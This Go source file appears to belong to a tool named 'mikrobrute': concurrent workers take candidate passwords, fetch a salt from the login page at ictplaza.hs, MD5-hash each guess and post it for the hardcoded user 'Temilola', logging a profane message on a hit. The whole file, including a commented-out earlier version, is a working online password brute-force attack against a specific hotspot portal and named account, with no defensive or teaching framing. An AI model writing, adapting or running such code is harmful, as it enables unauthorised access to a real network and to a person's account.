package workers

import (
	"fmt"
	"io/ioutil"
	"log"
	"mikrobrute/mdfive"
	"mikrobrute/util"
	"net/http"
	"net/url"
	"strconv"
)

type worker struct {
	name     string
	lastHash string
	nextSalt string
	errorJob string
}

/*func (w *worker) ListenAndExecute(str string, poolChan chan<- *worker) {

	fmt.Printf("Worker %s processing job %s\n", w.name, str)
	defer func() {
		poolChan <- w
	}()

	var salt string

	if w.errorJob != "" {
		w.errorJob = ""
	}

	if w.lastHash == "" {
		fmt.Printf("Worker %s Doesn't Have A Salt, Getting A New One\n", w.name)
		resp, err := http.Get("http://ictplaza.hs/login")

		if err != nil {
			log.Printf("something went wrong and worker %s couldn't get salt", w.name)
			w.errorJob = str
			return
		}

		fmt.Println("Here")
		body, _ := ioutil.ReadAll(resp.Body)
		fmt.Println("But Not Here")

		fmt.Println(string(body))

		_ = resp.Body.Close()

		salt = util.ExtractSalt(string(body), str)
	} else {
		salt = util.ExtractSalt(w.lastHash, str)
	}

	hash := mdfive.Hash(salt)

	fmt.Println("We're Here")

	resp, err := http.PostForm("http://ictplaza.hs/login", url.Values{"username": {"Temilola"}, "password": {hash}})

	if err != nil {
		log.Printf("something went wrong and worker %s couldn't complete the request", w.name)
		w.errorJob = str
		return
	}

	body, _ := ioutil.ReadAll(resp.Body)
	_ = resp.Body.Close()

	if util.CheckForSuccess(string(body)) {
		log.Println("I Found A Fucking Hit")
	}
}*/

func New(id int) *worker {
	return &worker{
		name: strconv.Itoa(id),
	}
}

func (w *worker) ListenAndExecute(jobChan <-chan string) {

	for str := range jobChan {
		fmt.Printf("Worker %s processing job %s\n", w.name, str)

		var salt string

		if w.errorJob != "" {
			w.errorJob = ""
		}

		if w.lastHash == "" {
			fmt.Printf("Worker %s Doesn't Have A Salt, Getting A New One\n", w.name)
			resp, err := http.Get("http://ictplaza.hs/login")

			if err != nil {
				log.Printf("something went wrong and worker %s couldn't get salt", w.name)
				w.errorJob = str
				return
			}

			body, _ := ioutil.ReadAll(resp.Body)

			_ = resp.Body.Close()

			salt = util.ExtractSalt(string(body), str)
		} else {
			fmt.Printf("Last Salt: %s\n", w.lastHash)
			salt = util.ExtractSalt(w.nextSalt, str)
		}

		fmt.Println("Current Salt: ", salt)
		hash := mdfive.Hash(salt)

		fmt.Println("Hash: ", hash)

		resp, err := http.PostForm("http://ictplaza.hs/login", url.Values{"username": {"Temilola"}, "password": {hash}, "dst": {""}, "popup": {"true"}})

		if err != nil {
			log.Printf("something went wrong and worker %s couldn't complete the request", w.name)
			w.errorJob = str
			return
		}

		body, _ := ioutil.ReadAll(resp.Body)
		_ = resp.Body.Close()

		if util.CheckForSuccess(string(body)) {
			log.Println("I Found A Fucking Hit")
		} else {
			w.lastHash = salt
			w.nextSalt = util.ExtractSalt(string(body), str)
		}
	}
}
